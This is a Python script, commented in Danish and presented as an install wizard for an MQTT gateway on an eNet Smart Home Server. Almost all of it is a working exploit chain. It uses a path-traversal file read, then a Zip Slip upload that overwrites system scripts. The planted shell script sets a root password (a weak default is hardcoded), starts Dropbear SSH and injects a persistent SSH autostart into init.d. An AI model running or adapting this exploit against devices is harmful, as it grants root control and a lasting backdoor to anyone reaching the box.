#!/usr/bin/env python3
"""
build_unified_payload.py
========================
Komplet interaktiv installations- og udrulningsguide (Wizard) til eNet Smart Home Server.
Forbinder automatisk til eNet, trækker session-cookie, bygger RCE-payload (Zip Slip)
med brugerdefinerede MQTT- og root SSH-indstillinger, uploader og aktiverer det.

Ingen eksterne biblioteker påkrævet (100% standard Python 3).
"""

import sys
import os
import json
import urllib.request
import http.cookiejar
import getpass
import zipfile
import time
import socket

# Stier på eNet-boksen (path traversal stier til Zip Slip)
ENET_RESTART_FELIX  = "../../../../../../home/insta/felix-framework/script/restartFelix"
ENET_RESET_SYSTEM   = "../../../../../../home/insta/felix-framework/script/resetSystem"
ENET_BUNDLE_DIR     = "../../../../../../home/insta/felix-framework/bundle/startlevel4"
ENET_BUNDLE_FILE    = "enet-mqtt-2.0-PRODUCTION.jar"
ENET_DROPBEAR_PATH  = "../../../../../../usr/sbin/dropbearmulti"
ENET_INIT_SCRIPT    = "/etc/init.d/felix.sh"
ENET_CONFIG_PROP    = "/home/insta/felix-framework/conf/config.properties"
ENET_MQTT_PROP      = "/home/insta/felix-framework/conf/mqtt-gateway.properties"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_input(prompt, default=None):
    if default is not None:
        val = input(f"{prompt} [{default}]: ").strip()
        return val if val else default
    else:
        while True:
            val = input(f"{prompt}: ").strip()
            if val:
                return val
            print("Værdien må ikke være tom.")

def get_password(prompt, default=None):
    if default is not None:
        val = getpass.getpass(f"{prompt} (Tryk Enter for default '{default}'): ").strip()
        return val if val else default
    else:
        while True:
            val = getpass.getpass(f"{prompt}: ").strip()
            if val:
                return val
            print("Adgangskode må ikke være tom.")

def print_step(step_num, title):
    print("\n" + "=" * 60)
    print(f" TRIN {step_num}: {title}")
    print("=" * 60)

def main():
    clear_screen()
    print("+==================================================================+")
    print("|     eNet Smart Home Server — Native MQTT Gateway Installer        |")
    print("|     100% Automatiseret & Interaktiv Installationsguide           |")
    print("+==================================================================+")
    print()

    # -------------------------------------------------------------------------
    # TRIN 1: Saml informationer
    # -------------------------------------------------------------------------
    print_step(1, "Konfiguration af enheder og netværk")
    
    enet_ip = get_input("eNet Server IP-adresse", "10.0.0.9")
    enet_user = get_input("eNet Web Admin brugernavn", "admin")
    enet_pass = get_password("eNet Web Admin adgangskode")
    
    mqtt_host = get_input("MQTT Broker IP-adresse", "10.0.0.6")
    mqtt_port = get_input("MQTT Broker Port", "1883")
    mqtt_user = get_input("MQTT Brugernavn", "homeassistant")
    mqtt_pass = get_password("MQTT Adgangskode")
    
    root_ssh_pass = get_password("Vælg nyt ROOT SSH-password til eNet-boksen", "pvxtwl")
    
    print("\n[✓] Alle informationer modtaget. Starter udrulning...")
    time.sleep(1)

    # -------------------------------------------------------------------------
    # TRIN 2: Log ind og hent Cookie
    # -------------------------------------------------------------------------
    print_step(2, "Forbinder og logger ind på eNet-serveren")
    print(f"Sender login-forespørgsel til http://{enet_ip}/jsonrpc/management ...")
    
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    
    login_payload = {
        "jsonrpc": "2.0",
        "method": "userLogin",
        "params": {
            "userName": enet_user,
            "userPassword": enet_pass
        },
        "id": "1"
    }
    
    try:
        req = urllib.request.Request(
            f"http://{enet_ip}/jsonrpc/management",
            data=json.dumps(login_payload).encode('utf-8'),
            headers={"Content-Type": "application/json"}
        )
        with opener.open(req, timeout=10) as response:
            resp_data = json.loads(response.read().decode('utf-8'))
            if "error" in resp_data:
                print(f"[!] Login afvist af eNet-serveren: {resp_data['error'].get('message', 'Ukendt fejl')}")
                sys.exit(1)
            
            session_cookie = None
            for cookie in cj:
                if cookie.name == "INSTASESSIONID":
                    session_cookie = cookie.value
                    break
            
            if not session_cookie:
                print("[!] Login lykkedes, men fandt ikke INSTASESSIONID i cookien.")
                sys.exit(1)
                
            print(f"[✓] Login godkendt! Session Cookie (INSTASESSIONID) modtaget.")
    except Exception as e:
        print(f"[!] Kunne ikke forbinde til eNet-serveren: {e}")
        sys.exit(1)

    # -------------------------------------------------------------------------
    # TRIN 3: LFI Rekognoscering og validering
    # -------------------------------------------------------------------------
    print_step(3, "Validerer forbindelse via Local File Inclusion (LFI)")
    print("Tester LFI path traversal mod Felix konfigurationsfil...")
    
    lfi_url = f"http://{enet_ip}////////../../../../../../home/insta/felix-framework/conf/config.properties"
    try:
        req = urllib.request.Request(lfi_url, headers={"Cookie": f"INSTASESSIONID={session_cookie}"})
        with opener.open(req, timeout=10) as response:
            properties = response.read().decode('utf-8')
            if "felix.auto.start.4" in properties:
                print("[✓] LFI sårbarhed verificeret! Kunne læse config.properties succesfuldt.")
            else:
                print("[WARN] Modtog data via LFI, men filen lignede ikke config.properties.")
    except Exception as e:
        print(f"[!] LFI validering fejlede. Cookien er muligvis ugyldig, eller firmwaren er patchet: {e}")
        sys.exit(1)

    # -------------------------------------------------------------------------
    # TRIN 4: Byg installationsscript og payload ZIP
    # -------------------------------------------------------------------------
    print_step(4, "Bygger udrulningspayload og installationsscript")
    
    # Indlæs MQTT gateway JAR
    mqtt_jar_path = "felix/target/enet-mqtt-2.0-PRODUCTION.jar"
    mqtt_jar_data = None
    if os.path.exists(mqtt_jar_path):
        with open(mqtt_jar_path, "rb") as f:
            mqtt_jar_data = f.read()
        print(f"[✓] Indlæste MQTT Gateway JAR ({len(mqtt_jar_data)/1024:.1f} KB)")
    else:
        print(f"[!] MQTT JAR ikke fundet på '{mqtt_jar_path}'!")
        print("    Husk at bygge den først med: bash scripts/build.sh")
        sys.exit(1)

    # Indlæs Dropbear (hvis den findes lokalt)
    dropbear_path = "dropbearmulti"
    dropbear_data = None
    if os.path.exists(dropbear_path):
        with open(dropbear_path, "rb") as f:
            dropbear_data = f.read()
        print(f"[✓] Indlæste Dropbear ARMv7l binary ({len(dropbear_data)/1024:.1f} KB)")
    else:
        print("[!] Dropbear binary ('dropbearmulti') blev ikke fundet lokalt.")
        print("    Udrulningen fortsætter. Scriptet vil forsøge at genbruge boksens eksisterende Dropbear.")

    # Generer installer-scriptet (der overskriver restartFelix/resetSystem)
    mqtt_uri = f"tcp://{mqtt_host}:{mqtt_port}"
    
    installer_script = f'''#!/bin/sh
# ============================================================
# eNet Unified Installer — Korer som root via Zip Slip RCE
# Konfigureret dynamisk via Python wizard
# ============================================================
set -e

LOG="/tmp/enet_install.log"
exec > "$LOG" 2>&1
echo "================================================"
echo " eNet Unified Installer — Starter $(date)"
echo "================================================"

# 1. Gør filsystemet skrivbart
echo "[1/6] Remounting filesystem as read-write..."
mount -o remount,rw / 2>/dev/null || true

# 2. Sæt root password
echo "[2/6] Setting root SSH password..."
if command -v chpasswd >/dev/null 2>&1; then
    echo "root:{root_ssh_pass}" | chpasswd
else
    echo -e "{root_ssh_pass}\\n{root_ssh_pass}" | passwd root
fi

# 3. Opsæt Dropbear SSH
echo "[3/6] Configuring Dropbear SSH..."
DROPBEAR_BIN=""
DROPBEARKEY_BIN=""

if [ -x /usr/sbin/dropbearmulti ]; then
    echo "  Using local dropbearmulti (uploaded)"
    DROPBEAR_BIN="/usr/sbin/dropbearmulti dropbear"
    DROPBEARKEY_BIN="/usr/sbin/dropbearmulti dropbearkey"
    ln -sf /usr/sbin/dropbearmulti /usr/sbin/dropbear 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/dropbearkey 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/scp 2>/dev/null || true
    ln -sf /usr/sbin/dropbearmulti /usr/bin/dbclient 2>/dev/null || true
elif command -v dropbear >/dev/null 2>&1; then
    echo "  Using existing dropbear in path"
    DROPBEAR_BIN="dropbear"
elif [ -x /usr/sbin/dropbear ]; then
    echo "  Using existing /usr/sbin/dropbear"
    DROPBEAR_BIN="/usr/sbin/dropbear"
fi

if [ -z "$DROPBEARKEY_BIN" ]; then
    if command -v dropbearkey >/dev/null 2>&1; then
        DROPBEARKEY_BIN="dropbearkey"
    elif [ -x /usr/bin/dropbearkey ]; then
        DROPBEARKEY_BIN="/usr/bin/dropbearkey"
    fi
fi

if [ -n "$DROPBEARKEY_BIN" ]; then
    mkdir -p /etc/dropbear
    [ ! -f /etc/dropbear/dropbear_rsa_host_key ] && $DROPBEARKEY_BIN -t rsa -f /etc/dropbear/dropbear_rsa_host_key 2>/dev/null || true
    [ ! -f /etc/dropbear/dropbear_ecdsa_host_key ] && $DROPBEARKEY_BIN -t ecdsa -f /etc/dropbear/dropbear_ecdsa_host_key 2>/dev/null || true
    [ ! -f /etc/dropbear/dropbear_ed25519_host_key ] && $DROPBEARKEY_BIN -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key 2>/dev/null || true
fi

killall dropbear 2>/dev/null || true
sleep 1
if [ -n "$DROPBEAR_BIN" ]; then
    $DROPBEAR_BIN -E -R -p 22 2>/tmp/dropbear.log &
    sleep 1
fi

# 4. Skriv MQTT gateway parametre
echo "[4/6] Writing MQTT gateway properties..."
mkdir -p {os.path.dirname(ENET_MQTT_PROP)}
cat > {ENET_MQTT_PROP} << 'MQTTEOF'
# eNet Native MQTT Gateway Configuration
MQTT_BROKER={mqtt_uri}
MQTT_USER={mqtt_user}
MQTT_PASS={mqtt_pass}
MQTTEOF

# 5. Felix config opdatering
echo "[5/6] Registering bundle in Felix config..."
CONFIG="{ENET_CONFIG_PROP}"
BUNDLE_URI="file:///home/insta/felix-framework/bundle/startlevel4/enet-mqtt-2.0-PRODUCTION.jar"

if [ -f "$CONFIG" ]; then
    cp "$CONFIG" "${{CONFIG}}.bak_$(date +%Y%m%d_%H%M%S)" 2>/dev/null || true
    if ! grep -q "enet-mqtt" "$CONFIG" 2>/dev/null; then
        echo "felix.auto.install.4=${{BUNDLE_URI}}" >> "$CONFIG"
    fi
    if ! grep -q "enet-mqtt" "$CONFIG" 2>/dev/null; then
        echo "felix.auto.start.4=${{BUNDLE_URI}}" >> "$CONFIG"
    fi
fi

# 6. Autostart Dropbear SSH i init
echo "[6/6] Injecting autostart into init.d..."
INIT_SCRIPT="{ENET_INIT_SCRIPT}"
if [ -f "$INIT_SCRIPT" ] && ! grep -q "dropbear" "$INIT_SCRIPT" 2>/dev/null; then
    cp "$INIT_SCRIPT" "${{INIT_SCRIPT}}.bak_$(date +%Y%m%d_%H%M%S)" 2>/dev/null || true
    awk '
        /^[[:space:]]*start[[:space:]]*)/ {{
            print
            print "    # === Auto-injected: Start Dropbear SSH ==="
            print "    if [ -x /usr/sbin/dropbearmulti ]; then"
            print "        /usr/sbin/dropbearmulti dropbear -E -R -p 22 &"
            print "    elif [ -x /usr/sbin/dropbear ]; then"
            print "        /usr/sbin/dropbear -E -R -p 22 &"
            print "    fi"
            next
        }}
        {{ print }}
    ' "$INIT_SCRIPT" > /tmp/felix_init_new
    if [ -s /tmp/felix_init_new ]; then
        cat /tmp/felix_init_new > "$INIT_SCRIPT"
        chmod +x "$INIT_SCRIPT"
    fi
fi

echo "================================================"
echo " eNet Unified Installer — Færdig $(date)"
echo "================================================"
'''

    # Skriv payload ZIP
    output_zip = "payload_unified.zip"
    with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(ENET_RESTART_FELIX, installer_script.encode('utf-8'))
        zf.writestr(ENET_RESET_SYSTEM, installer_script.encode('utf-8'))
        zf.writestr(f"{ENET_BUNDLE_DIR}/{ENET_BUNDLE_FILE}", mqtt_jar_data)
        if dropbear_data:
            zf.writestr(ENET_DROPBEAR_PATH, dropbear_data)
        zf.writestr("project/dummy_project.xml", b'<?xml version="1.0"?><project name="dummy"/>')

    print(f"[✓] Udrulningspayload opbygget succesfuldt: {output_zip} ({os.path.getsize(output_zip)/1024:.1f} KB)")

    # -------------------------------------------------------------------------
    # TRIN 5: Upload payload via Zip Slip
    # -------------------------------------------------------------------------
    print_step(5, "Uploader payload til eNet-serveren via Zip Slip sårbarhed")
    print(f"Uploader {output_zip} via POST til http://{enet_ip}/storage/upload ...")
    
    with open(output_zip, "rb") as f:
        zip_bytes = f.read()

    boundary = b'----WebKitFormBoundaryEnetPayload'
    parts = []
    parts.append(b'--' + boundary)
    parts.append(b'Content-Disposition: form-data; name="file"; filename="payload_unified.zip"')
    parts.append(b'Content-Type: application/zip')
    parts.append(b'')
    parts.append(zip_bytes)
    parts.append(b'--' + boundary)
    parts.append(b'Content-Disposition: form-data; name="project"')
    parts.append(b'')
    parts.append(b'installation')
    parts.append(b'--' + boundary + b'--')
    parts.append(b'')
    body = b'\r\n'.join(parts)

    try:
        req = urllib.request.Request(
            f"http://{enet_ip}/storage/upload",
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary.decode('utf-8')}",
                "Cookie": f"INSTASESSIONID={session_cookie}",
                "Content-Length": str(len(body))
            }
        )
        with opener.open(req, timeout=20) as response:
            if response.status == 200:
                print("[✓] Payload uploadet succesfuldt! Filerne er pakket ud på boksens filsystem.")
            else:
                print(f"[!] Upload modtog uventet statuskode: {response.status}")
                sys.exit(1)
    except Exception as e:
        print(f"[!] Upload mislykkedes: {e}")
        sys.exit(1)

    # -------------------------------------------------------------------------
    # TRIN 6: Trigger installation via restart
    # -------------------------------------------------------------------------
    print_step(6, "Trigger afvikling og genstart på eNet")
    print("Sender restart-JSON-RPC-kald for at køre installationsscriptet...")
    
    restart_payload = {
        "jsonrpc": "2.0",
        "method": "restartFelix",
        "params": [],
        "id": "2"
    }
    
    try:
        req = urllib.request.Request(
            f"http://{enet_ip}/jsonrpc",
            data=json.dumps(restart_payload).encode('utf-8'),
            headers={
                "Content-Type": "application/json",
                "Cookie": f"INSTASESSIONID={session_cookie}"
            }
        )
        with opener.open(req, timeout=10) as response:
            print("[✓] Genstarts-signal leveret. Apache Felix lukker ned og kører scriptet...")
    except Exception as e:
        # Ofte vil forbindelsen blive afbrudt under genstarten, hvilket er et godt tegn
        print("[✓] Forbindelsen afbrudt – genstart er sandsynligvis i gang.")

    # -------------------------------------------------------------------------
    # TRIN 7: Verifikation af installation
    # -------------------------------------------------------------------------
    print_step(7, "Venter på genstart og verificerer SSH-forbindelse")
    print("Venter 25 sekunder på at systemet booter og Dropbear SSH starter...")
    
    for i in range(25, 0, -1):
        print(f"  Venter... {i}s", end="\r")
        time.sleep(1)
    print()

    print(f"Tester om SSH-port 22 svarer på {enet_ip}...")
    ssh_success = False
    for attempt in range(5):
        try:
            s = socket.create_connection((enet_ip, 22), timeout=3)
            s.close()
            ssh_success = True
            break
        except Exception:
            print(f"  Forsøg {attempt + 1}/5: SSH-port ikke klar endnu, venter...")
            time.sleep(3)

    if ssh_success:
        print("\n" + "*" * 60)
        print(" 🎉 TILLYKKE! INSTALLATIONEN ER SUCCESFULDT GENNEMFØRT!")
        print("*" * 60)
        print(f"\nDu kan nu oprette forbindelse til din eNet-server via SSH:")
        print(f"  Brugernavn: root")
        print(f"  Værts-IP:   {enet_ip}")
        print(f"  Kodeord:    (Det root-password du indtastede under opsætningen)")
        print(f"\nBrug følgende kommando til at tjekke installationsloggen på boksen:")
        print(f"  ssh root@{enet_ip} 'cat /tmp/enet_install.log'")
        print(f"\nMQTT-forbindelsen kan verificeres på Web Dashboard:")
        print(f"  http://{enet_ip}:8090/mqtt")
    else:
        print("\n[!] Installationen blev trigget, men SSH (port 22) svarede ikke inden for tidsgrænsen.")
        print(f"    Tjek venligst om din eNet-server kan pinges på {enet_ip},")
        print(f"    og om webinterfacet er kommet op igen.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Installations-guidens wizard afbrudt af brugeren.")
        sys.exit(0)